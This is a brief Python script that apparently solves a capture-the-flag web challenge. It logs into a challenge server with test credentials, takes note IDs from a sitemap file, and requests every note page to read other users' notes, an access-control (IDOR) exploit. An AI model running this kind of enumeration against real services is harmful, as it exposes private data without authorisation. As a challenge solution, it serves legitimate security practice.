import requests
import re

TARGET_URL = 'http://gc1.eng.run:30509'
notes = []

def start(user,pw):
    s = requests.Session()
    data = {
        "username":user,
        "password":pw
    }
    s.post(f"{TARGET_URL}/",data=data)
    res=s.post(f"{TARGET_URL}/",data=data)
    #print(res.text)
    return s

def viewNote(s,note):
    res=s.get(f"{TARGET_URL}/note/{note}",allow_redirects=False)
    print(res.text)

def getNotes():
    with open('test.xml','r') as f:
        lines=f.readlines()
        for line in lines:
            note=re.findall('<loc>http://localhost/note/(.*?)</loc>',line)
            if len(note)>0:
                notes.append(note[0])

getNotes()
s=start("test","test")
for note in notes:
    viewNote(s,note)
